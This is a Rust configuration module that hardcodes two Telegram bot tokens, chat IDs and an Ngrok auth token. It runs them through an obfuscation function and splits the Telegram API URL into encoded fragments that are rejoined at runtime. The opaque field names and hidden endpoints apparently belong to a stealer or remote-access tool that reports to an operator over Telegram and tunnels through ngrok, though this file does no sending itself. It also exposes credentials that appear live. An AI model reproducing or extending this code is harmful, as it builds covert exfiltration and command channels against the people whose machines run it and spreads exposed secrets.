use crate::encryption::{z26, aa27};
use once_cell::sync::Lazy;
use std::sync::Mutex;
use base64::{engine::general_purpose::STANDARD, Engine as _};

#[derive(Clone)]
pub struct Config {
    pub t1: String,        // Telegram bot token 1
    pub t2: String,        // Telegram bot token 2
    pub c1: String,        // Chat ID 1
    pub c2: String,        // Chat ID 2
    pub port: u16,         // HTTP server port
    pub na: String,        // Ngrok auth token
    pub tu: Vec<String>,   // Telegram API URL parts
}

pub static SECRET_KEY: Lazy<Mutex<String>> = Lazy::new(|| {
    use rand::{thread_rng, RngCore};
    let mut key = [0u8; 16];
    thread_rng().fill_bytes(&mut key);
    Mutex::new(STANDARD.encode(key))
});

impl Config {
    pub fn new() -> Self {
        Config {
            t1: z26("7879165650:AAEGlyytdOBGxYZ3Pa-Xkkkx2Qg7GzLFG5U".to_string()),
            t2: z26("7891701300:AAE8eJqoqOI_1KIyv2OSydl35iiUcmfWMKY".to_string()),
            c1: z26("1660587036".to_string()),
            c2: z26("1660587036".to_string()),
            port: 8082,
            na: z26("2pDRBFLOSbsnWjTJoJI8Fy2AWF4_2FLnrWQQc1tv3Qyrpw1z1".to_string()),
            tu: vec![
                z26("https://".to_string()),
                z26("api.".to_string()),
                z26("telegram.".to_string()),
                z26("org/".to_string()),
                z26("bot".to_string()),
            ],
        }
    }
    
    pub fn telegram_base_url(&self) -> String {
        let mut parts = Vec::new();
        for s in &self.tu {
            parts.push(aa27(s.clone()));
        }
        parts.join("")
    }
}